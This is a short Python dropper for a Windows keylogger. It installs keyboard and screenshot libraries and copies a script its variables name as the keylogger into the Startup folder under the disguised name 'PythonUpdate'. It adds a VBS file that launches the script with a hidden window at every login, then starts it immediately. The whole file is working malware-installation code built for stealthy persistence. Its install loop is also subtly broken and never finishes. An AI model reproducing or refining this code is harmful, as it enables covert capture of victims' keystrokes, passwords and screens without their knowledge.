import subprocess
import sys
import time
import os
import shutil

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

packages = [
    "keyboard",
    "pyscreenshot",
    "Pillow",
]

all_installed = False
while not all_installed:
    all_installed = all(install(package) for package in packages)
    if not all_installed:
        time.sleep(15)

time.sleep(15)

startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

current_dir = os.getcwd()
keylogger_script = os.path.join(current_dir, "PythonUpdate.py")
keylogger_script_startup = os.path.join(startup_folder, "PythonUpdate.pyw")
bat_script_path = os.path.join(startup_folder, "PythonUpdate.vbs")

shutil.copy(keylogger_script, keylogger_script_startup)

with open(bat_script_path, 'w') as vbs_file:
    vbs_file.write(f'Set WshShell = CreateObject("WScript.Shell")\n')
    vbs_file.write(f'WshShell.Run "pythonw.exe {keylogger_script_startup}", 0\n')

subprocess.run(["pythonw.exe", keylogger_script])